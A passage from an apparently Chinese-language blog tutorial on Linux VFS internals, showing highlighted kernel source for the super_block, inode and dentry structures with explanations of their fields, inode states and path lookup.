CONFIG_SECURITY</span></span><br><span class="line"><span class="type">void</span>                    *s_security;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">xattr_handler</span>**<span class="title">s_xattr</span>;</span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span class="title">s_inodes</span>;</span><span class="comment">/* all inodes */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span class="title">s_dirty</span>;</span><span class="comment">/* dirty inodes */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span class="title">s_io</span>;</span><span class="comment">/* parked for writeback */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hlist_head</span><span class="title">s_anon</span>;</span><span class="comment">/* anonymous dentries for (nfs) exporting */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span class="title">s_files</span>;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">block_device</span>*<span class="title">s_bdev</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mtd_info</span>*<span class="title">s_mtd</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span class="title">s_instances</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">quota_info</span><span class="title">s_dquot</span>;</span><span class="comment">/* Diskquota specific options */</span></span><br><span class="line"> </span><br><span class="line"><span class="type">int</span>s_frozen;</span><br><span class="line"><span class="type">wait_queue_head_t</span>s_wait_unfrozen;</span><br><span class="line"><span class="type">char</span> s_id[<span class="number">32</span>];<span class="comment">/* Informational name */</span></span><br><span class="line"><span class="type">void</span> *s_fs_info;<span class="comment">/* Filesystem private info */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The next field is for VFS *only*. No filesystems have any business</span></span><br><span class="line"><span class="comment"> * even looking at it. You had been warned.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">s_vfs_rename_mutex</span>;</span><span class="comment">/* Kludge */</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Granularity of c/m/atime in ns.</span></span><br><span class="line"><span class="comment">   Cannot be worse than a second */</span></span><br><span class="line">u32   s_time_gran;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Filesystem subtype.  If non-empty the filesystem type field</span></span><br><span class="line"><span class="comment"> * in /proc/mounts will be &quot;type.subtype&quot;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">char</span> *s_subtype;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>​以上代码在注释中有对每一项的解释，下面列出几个比较重要的成员单独提一下：</p><ul><li><code>struct list_heads_list;</code>：双向循环链表，前后指针连接所有超级块的链表，其结构体实现为 <code>struct list_head *next, *prev;</code>。</li><li><code>unsigned chars_dirt;</code>：修改（脏页）标记。</li><li><code>struct file_system_type   *s_type;</code>：文件系统类型结构体（比如是 EXT2 还是 FAT32），里边是对文件系统的细节描述，后面有介绍。</li><li><code>const struct super_operations *s_op;</code>：超级块方法结构体，定义了超级块操作函数指针的集合，例如有 <code>(* destroy_inode) </code>，<code>(* write_inode)</code> ，<code>(* free_inode)</code> 等等。</li><li><code>struct dentry  *s_root;</code>：超级块内的指向根目录的 dentry 结构体指针。（dentry 结构体简单来说就是形成 Linux 文件树形结构的节点，我们在后面再进一步详解。）</li><li><code>struct list_heads_inodes;</code>：指向 inode 节点链表，该结构体马上会介绍到。</li><li><code>struct list_heads_dirty;</code>：指向脏的 inode 节点链表，因此当要回写所有脏 inode 到磁盘时便无需遍历所有的 inode 节点。</li></ul><p>​超级块通过 alloc_super() 函数创建并初始化，在文件系统安装时，文件系统会调用该函数以便于从磁盘中读取文件系统超级块，并且将信息填充到内存中的超级块对象中。</p><h2 id="索引节点（index-node，inode）"><a href="#索引节点（index-node，inode）" class="headerlink" title="索引节点（index node，inode）"></a>索引节点（index node，inode）</h2><p>​Unix&#x2F;Linux 操作系统将一个文件实际上分成两部分，一部分是文件数据本身，另一部分是文件的控制信息，例如文件大小，设备标识符文件模式，扩展属性等等，这些信息又被称为文件的元数据，它们由 <code>struct inode</code>所表示，在 Linux 中可用<code>stat file</code>查看其 inode 信息。比如我们使用<code>ls -l</code>命令查看的就是文件的一些元数据而非文件本身。同时注意：inode 有两种，一种是 VFS 的 inode，一种是具体文件系统的 inode 。前者在内存中，后者在磁盘中。所以每次其实是将磁盘中的 inode 调进填充内存中的 inode，这样才是算使用了磁盘文件 inode，而对 VFS 索引节点的任何修改都将写回磁盘更新磁盘的索引节点 。此外，由于文件系统种类繁多，某些文件系统可能并不能完整地包含索引节点结构体所要求的所有信息，例如，有的文件系统可能并不记录文件的访问时间，这时该文件系统可以在实现中选择合适的办法来解决这个问题。</p><p>​每个文件都有全系统唯一的 inode 编号，用于 Linux 内部区分不同文件，在通过文件名读文件时，首先系统找到该文件名对应的 inode 号；其次通过 inode 号获取 inode 信息；最后根据 inode 信息找到文件数据所在的 block并读出数据。</p><blockquote><p>正因此也使得软件更新变得简单，可以在不关闭软件的情况下进行更新，不需要重启。因为系统通过 inode 号识别运行中的文件而非文件名。更新时新版文件以同样的文件名生成一个新的 inode ，不会影响到正在运行中的文件。等到下一次运行该软件的时，文件名就自动指向新版文件了，而旧版文件的 inode 则已被回收。</p></blockquote><p>​inode 结构体数据结构相对稳定，没有变长数据，可以固定其大小，进而可以实现将整个文件系统中的 inode 按照一定的组织方式（数组）来集中存储在硬盘某位置，文件系统加载时很方便查找，一般每个inode节点的大小是128字节或256字节。最后提一点，inode 包含一个文件的所有描述信息，除了文件名，至于为什么我们后面再提。下面来看一看 inode 的源码，定义于<code>linux/fs.h</code>里。</p><blockquote><p>由于每个文件都必须有一个inode，因此有可能发生inode已经用光，但是硬盘还未存满的情况。这时，就无法在硬盘上创建新文件。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode</span> &#123;</span></span><br><span class="line">    <span class="type">umode_t</span>         i_mode;<span class="comment">//文件的访问权限（eg:rwxrwxrwx）</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span>      i_opflags;</span><br><span class="line">    <span class="type">kuid_t</span>          i_uid;<span class="comment">//inode拥有者id</span></span><br><span class="line">    <span class="type">kgid_t</span>          i_gid;<span class="comment">//inode拥有者组id</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>        i_flags;<span class="comment">//inode标志，可以是S_SYNC,S_NOATIME,S_DIRSYNC等</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_FS_POSIX_ACL</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">posix_acl</span>    *<span class="title">i_acl</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">posix_acl</span>    *<span class="title">i_default_acl</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">inode_operations</span>   *<span class="title">i_op</span>;</span><span class="comment">//inode操作</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">super_block</span>  *<span class="title">i_sb</span>;</span><span class="comment">//所属的超级块</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        address_space并不代表某个地址空间，而是用于描述页高速缓存中的页面的一个文件对应一个address_space，一个address_space与一个偏移量能够确定一个一个也高速缓存中的页面。i_mapping通常指向i_data,不过两者是有区别的，i_mapping表示应该向谁请求页面，i_data表示被改inode读写的页面。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">address_space</span>    *<span class="title">i_mapping</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">    <span class="type">void</span>            *i_security;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Stat data, not accessed from path walking */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>       i_ino;<span class="comment">//inode号</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Filesystems may only read i_nlink directly.  They shall use the</span></span><br><span class="line"><span class="comment">     * following functions for modification:</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     *    (set|clear|inc|drop)_nlink</span></span><br><span class="line"><span class="comment">     *    inode_(inc|dec)_link_count</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="type">const</span> <span class="type">unsigned</span> <span class="type">int</span> i_nlink;<span class="comment">//硬链接个数</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> __i_nlink;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">dev_t</span>           i_rdev;<span class="comment">//如果inode代表设备，i_rdev表示该设备的设备号</span></span><br><span class="line">    <span class="type">loff_t</span>          i_size;<span class="comment">//文件大小</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timespec</span>     <span class="title">i_atime</span>;</span><span class="comment">//最近一次访问文件的时间</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timespec</span>     <span class="title">i_mtime</span>;</span><span class="comment">//最近一次修改文件的时间</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timespec</span>     <span class="title">i_ctime</span>;</span><span class="comment">//最近一次修改inode的时间</span></span><br><span class="line">    <span class="type">spinlock_t</span>      i_lock; <span class="comment">/* i_blocks, i_bytes, maybe i_size */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span>          i_bytes;<span class="comment">//文件中位于最后一个块的字节数</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>        i_blkbits;<span class="comment">//以bit为单位的块的大小</span></span><br><span class="line">    <span class="type">blkcnt_t</span>        i_blocks;<span class="comment">//文件使用块的数目</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __NEED_I_SIZE_ORDERED</span></span><br><span class="line">    <span class="type">seqcount_t</span>      i_size_seqcount;<span class="comment">//对i_size进行串行计数</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Misc */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>       i_state;<span class="comment">//inode状态，可以是I_NEW,I_LOCK,I_FREEING等</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span>        <span class="title">i_mutex</span>;</span><span class="comment">//保护inode的互斥锁</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//inode第一次为脏的时间 以jiffies为单位</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>       dirtied_when;   <span class="comment">/* jiffies of first dirtying */</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hlist_node</span>   <span class="title">i_hash</span>;</span><span class="comment">//散列表</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>    <span class="title">i_wb_list</span>;</span>  <span class="comment">/* backing dev IO list */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>    <span class="title">i_lru</span>;</span>      <span class="comment">/* inode LRU list */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>    <span class="title">i_sb_list</span>;</span><span class="comment">//超级块链表</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">hlist_head</span>   <span class="title">i_dentry</span>;</span><span class="comment">//所有引用该inode的目录项形成的链表</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>     <span class="title">i_rcu</span>;</span></span><br><span class="line">    &#125;;</span><br><span class="line">    u64         i_version;<span class="comment">//版本号 inode每次修改后递增</span></span><br><span class="line">    <span class="type">atomic_t</span>        i_count;<span class="comment">//引用计数</span></span><br><span class="line">    <span class="type">atomic_t</span>        i_dio_count;</span><br><span class="line">    <span class="type">atomic_t</span>        i_writecount;<span class="comment">//记录有多少个进程以可写的方式打开此文件</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span>    *<span class="title">i_fop</span>;</span> <span class="comment">/* former -&gt;i_op-&gt;default_file_ops */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file_lock</span>    *<span class="title">i_flock</span>;</span><span class="comment">//文件锁链表</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">address_space</span>    <span class="title">i_data</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_QUOTA</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dquot</span>        *<span class="title">i_dquot</span>[<span class="title">MAXQUOTAS</span>];</span><span class="comment">//inode磁盘限额</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        公用同一个驱动的设备形成链表，比如字符设备，在open时，会根据i_rdev字段查找相应的驱动程序，并使i_cdev字段指向找到的cdev，然后inode添加到struct cdev中的list字段形成的链表中</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>    <span class="title">i_devices</span>;</span>，</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span>  *<span class="title">i_pipe</span>;</span><span class="comment">//如果文件是一个管道则使用i_pipe</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">block_device</span> *<span class="title">i_bdev</span>;</span><span class="comment">//如果文件是一个块设备则使用i_bdev</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">cdev</span>     *<span class="title">i_cdev</span>;</span><span class="comment">//如果文件是一个字符设备这使用i_cdev</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    __u32           i_generation;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_FSNOTIFY</span></span><br><span class="line">   <span class="comment">//目录通知事件掩码</span></span><br><span class="line">    __u32           i_fsnotify_mask; <span class="comment">/* all events this inode cares about */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hlist_head</span>   <span class="title">i_fsnotify_marks</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_IMA</span></span><br><span class="line">    <span class="type">atomic_t</span>        i_readcount; <span class="comment">/* struct files open RO */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="comment">//存储文件系统或者设备的私有信息</span></span><br><span class="line">    <span class="type">void</span>            *i_private; <span class="comment">/* fs or device private pointer */</span></span><br><span class="line">    <span class="comment">//存储各个特定的文件系统属性</span></span><br><span class="line">   <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">minix_inode_info</span> <span class="title">minix_i</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ext2_inode_info</span> <span class="title">ext2_i</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ext3_inode_info</span> <span class="title">ext3_i</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hpfs_inode_info</span> <span class="title">hpfs_i</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ntfs_inode_info</span> <span class="title">ntfs_i</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msdos_inode_info</span> <span class="title">msdos_i</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">umsdos_inode_info</span> <span class="title">umsdos_i</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iso_inode_info</span> <span class="title">isofs_i</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sysv_inode_info</span> <span class="title">sysv_i</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">affs_inode_info</span> <span class="title">affs_i</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ufs_inode_info</span> <span class="title">ufs_i</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">efs_inode_info</span> <span class="title">efs_i</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">romfs_inode_info</span> <span class="title">romfs_i</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">shmem_inode_info</span> <span class="title">shmem_i</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">coda_inode_info</span> <span class="title">coda_i</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">smb_inode_info</span> <span class="title">smbfs_i</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hfs_inode_info</span> <span class="title">hfs_i</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">adfs_inode_info</span> <span class="title">adfs_i</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">qnx4_inode_info</span> <span class="title">qnx4_i</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">reiserfs_inode_info</span> <span class="title">reiserfs_i</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bfs_inode_info</span> <span class="title">bfs_i</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">udf_inode_info</span> <span class="title">udf_i</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ncp_inode_info</span> <span class="title">ncpfs_i</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc_inode_info</span> <span class="title">proc_i</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">socketsocket_i</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">usbdev_inode_info</span> <span class="title">usbdev_i</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">jffs2_inode_infojffs2_i</span>;</span></span><br><span class="line">    <span class="type">void</span> *generic_ip;</span><br><span class="line">&#125; u;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​以上代码在注释中有对每一项的解释，下面列出几个比较重要的成员单独提一下：</p><ul><li><code>struct hlist_node   i_hash;</code>：哈希表，内部为 <code>struct hlist_node *next, **pprev;</code>。系统通过 VFS inode 链表来对其进行组织，为了提高访问效率相应地构造了 inode 构造缓存和 此hash table。</li><li><code>struct list_head    i_list, i_sb_list, i_dentry;</code>：分别是索引节点链表，超级块链表和目录项链表。</li><li><code> unsigned long       i_ino;</code>：用于唯一的标识的索引节点号。</li><li><code>atomic_t        i_count;</code>：引用计数。</li><li><code> unsignd inti_nlink</code>：硬链接数。（关于软硬链接的区别不了解的话可以搜搜）</li><li><code>umode_t         i_mode;</code>：文件访问权限（eg：rwxrwxrwx），掩码格式表示。</li><li><code>kuid_t          i_uid;</code>：inode 拥有者 id。</li><li><code>loff_t          i_size;</code>：文件大小。</li><li><code>dev_t           i_rdev;</code>：如果 inode 代表设备，i_rdev 表示该设备的设备号。</li><li><code>struct address_space    *i_mapping;</code>：该指针指向和物理页 page 相关的结构体。</li><li><code>struct timespec     i_atime, i_mtime, i_ctime;</code>：最后一次访问，修改文件，修改 inode 时间。</li><li><code>struct super_block  *i_sb;</code>：所属的超级块指针。</li><li><code>const struct inode_operations   *i_op;</code>：inode 函数操作结构体。描述了可以对 inode 进行的一系列操作，例如 ：<code>(*create)</code>，<code>(*mkdir)</code>，<code>(*symlink)</code>等等。</li></ul><p>​当文件被进程打开时，磁盘里的 inode 结构体也就会被相应地加载进内存里，从内存的角度来看，inode 只可能处于3种状态之一</p><ol><li>inode存于内存中，没有被任何进程引用，不处于活动使用状态，也没有被修改过。</li><li>inode存于内存中，正被一个或多个进程引用，即它的 i_count 和 i_nlink 都大于0，且文件内容和 inode 元数据内容都没被修改过。</li><li>inode处于内存中，内容或元数据被修改过，即 inode 是脏的。</li></ol><p>​内核提供了3个全局的链表来管理这3种状态的 inode，inode_unused 对应于第一种情况，inode_in_use 对应于第二种情况，超级块的 s_dirty 链表对应第三种情况。任何时刻内存中的 inode 只能在这3个链表之一，使用了 i_list 指针指向它所在的链表。维护这3个链表的好处是，当脏数据写回到磁盘时，只需要遍历超级块 super_block -&gt; s_dirty 上所有的 inode 就行。</p><p>​以上我们可以看作是内存中的 VFS inode 结构体，而对于硬盘中不同的具体文件系统其还有自己的实现域，比如 EXT2 文件系统在指向文件数据的具体实现为 12个直接块指针，一个一级间接块指针，一个二级间接块指针和一个三级块指针。通过 inode 节点指向各个目录块和数据块，便形成了文件系统在磁盘中的组织形式。例如，下图是 EXT2 的改进版本 EXT4 的组织方式 。</p><p><img src="https://s2.loli.net/2023/01/16/wHjQp7i4OGEsn1V.png" alt="Linux目录树.png"></p><p>​接下来我们来看两个简单的例子粗浅地描述了其执行流程：</p><blockquote><p><code>mkdir /home/bingbing/zhuzhu.c 执行过程</code>：（1）通过块位图区找到空闲的数据块，存放 zhuzhu.c 中的内容 （2）通过 inode 位图区找到空闲的 inode 节点块，生成相应的 inode 节点 （3）在 bingbing 目录文件的数据块中添加一条 zhuzhu.c 的记录项。</p><p><code>vim /home/bingbing/cat.c执行过程</code>：（1）找到 inode 编号为 2 的 inode 节点（Linux 根目录索引节点号）。（2）遍历根目录文件的数据块中的记录项，匹配 home记录项，获取其 inode 编号。 （3）遍历 home 目录文件的数据块中的记录项，匹配 bingbing 记录项，获取其 inode 编号。 （4）遍历 bingbing 目录文件的数据块中的记录项，匹配 cat.c 记录项，获取其 inode 编号，找到对应的的数据块，最后用 vim 打开文件。</p></blockquote><blockquote><p>在这里抛出两个问题尚未解决，第一：dentry 只存在于内存里，那 inode 节点在树里的位置，还有比如它的父结点，子结点这些是在哪里存的呢？第二：inode结构体哪个成员表示其指向的数据块或者目录块？</p></blockquote><h1 id="文件在内存中的组织形式"><a href="#文件在内存中的组织形式" class="headerlink" title="文件在内存中的组织形式"></a>文件在内存中的组织形式</h1><p>​文件在磁盘中以超级块 -&gt; inode -&gt; 数据块&#x2F;目录块的形式进行组织，而进程在操作文件时会将其加载到内存中，下面我们来看一看文件在内存中的组织形式。</p><h2 id="目录项-dentry"><a href="#目录项-dentry" class="headerlink" title="目录项(dentry)"></a>目录项(dentry)</h2><p>​前面我们提到了 inode 节点并不存储文件的名字，实际上 dentry 结构体便用来记录文件的名字、对应文件的 inode 指针，与其他 dentry 的关联关系。而多个相互关联的 dentry 目录项形成的树，就构成文件系统的目录结构，这便是文件系统的逻辑组织结构。因此我们可以总结出来，在 Linux 内存里的文件可以看成两部分，一部分是 dentry 结构体组成的目录树，每个 dentry 节点指向对应文件的 inode ，用于描述文件信息，而 inode 节点又指向文件的具体内容。</p><blockquote><p>例如：open一个文件 <code>/home/code1/test.c</code>，那么 &#x2F;、home、code1、test.c 都是一个 dentry节点（目录项），VFS 在查找的时候，根据一层一层的目录项找到对应的每个目录项的 inode ，那么沿着目录项进行操作就可以找到最终的文件。</p></blockquote><p><img src="https://s2.loli.net/2023/01/16/noakKG86AJFOqle.png" alt="image.png"></p><p>​与 inode 不同，dentry 是由内核维护的一个内存数据结构，所以通常也被叫做 dentry cache（目录项缓存），因此 dentry 只存在于内存中，并非像 inode 一样存储在磁盘中，VFS 根据字符串形式的路径名现场创建它。dentry 与 inode 是多对一的关系，即一个文件能够具有多个名称 —— 硬连接是最好的例子。下面我们来看一下 dentry 结构体的代码，其定义于<code>&lt;linux/dcache.h</code>中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dentry</span> &#123;</span></span><br><span class="line"><span class="type">atomic_t</span> d_count;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> d_flags;<span class="comment">/* protected by d_lock */</span></span><br><span class="line"><span class="type">spinlock_t</span> d_lock;<span class="comment">/*自旋锁 per dentry lock */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">d_inode</span>;</span><span class="comment">/* Where the name belongs to - NULL is</span></span><br><span class="line"><span class="comment"> * negative */</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The next three fields are touched by __d_lookup.  Place them here</span></span><br><span class="line"><span class="comment"> * so they all fit in a cache line.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hlist_node</span> <span class="title">d_hash</span>;</span><span class="comment">/* lookup hash list */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dentry</span> *<span class="title">d_parent</span>;</span><span class="comment">/* parent directory */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">qstr</span> <span class="title">d_name</span>;</span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span 